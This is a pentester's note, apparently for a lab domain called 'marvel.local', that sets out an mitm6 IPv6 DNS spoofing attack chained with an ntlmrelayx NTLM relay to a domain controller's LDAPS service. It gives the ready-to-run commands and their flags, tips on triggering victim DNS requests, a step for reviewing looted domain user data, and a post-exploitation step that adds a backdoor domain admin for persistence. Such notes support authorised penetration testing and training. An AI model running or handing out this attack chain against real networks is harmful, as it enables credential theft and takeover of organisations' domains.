### **Pentest Note: MITM6 - DHCPv6/DNS6 Spoofing and NTLM Relay Attack**

#### **1. MITM6 Setup**
- **Command:**
  ```bash
  mitm6 -i ens33 -d marvel.local
  ```
  - **Use Case:** This command sets up a Man-in-the-Middle (MitM) attack on the `ens33` network interface within the `marvel.local` domain. MITM6 spoofs DHCPv6 and DNSv6 traffic to intercept and redirect IPv6 network communications.

#### **2. Relay Attack Setup**
- **Command:**
  ```bash
  ntlmrelayx.py -6 -t ldaps://domainIP -wh fakewpad.marvel.local -L lootme
  ```
  - **Use Case:** 
    - `-6`: Specifies that the attack should be conducted over IPv6.
    - `-t ldaps://domainIP`: Targets the LDAP(S) service on the domain controller, replacing `domainIP` with the actual IP address.
    - `-wh fakewpad.marvel.local`: Specifies the WPAD (Web Proxy Auto-Discovery Protocol) spoofed host within the `marvel.local` domain.
    - `-L lootme`: Directs the tool to store looted credentials or information in a specified directory ned "lootme."

This command sets up an NTLM relay attack, leveraging the IPv6 MitM to intercept and relay NTLM authentication attempts to a target domain controller's LDAPS service.

#### **3. Monitoring and Interaction**
- **Wait for DNS Requests:**
  - After starting MITM6, watch for DNS requests. Windows machines typically send DNS requests every 30 minutes, making them potential targets for the attack.
  
- **Handling Events:**
  - **Reboot Windows Machines:**
    - Rebooting a Windows machine can trigger immediate DNS requests, accelerating the exploitation process.
  - **Monitor Loot Directory:**
    - Check the loot directory for captured data:
    - **Command:**
      ```bash
      firefox domain_users_by_group.html
      ```
    - **Use Case:** Opens the HTML report containing information about domain users grouped by their respective groups. This helps in identifying high-value targets, such as domain admins.

#### **4. Post-Exploitation**
- **Admin Login Detection:**
  - Monitor for any administrative logins. If an admin logs in during the attack, MITM6's setup may allow you to add a new user or escalate privileges within the domain.

- **Adding a New User (if privileged access is gained):**
  - Once privileged access is obtained, create a new domain user and add it to the domain admins group to maintain control over the environment.
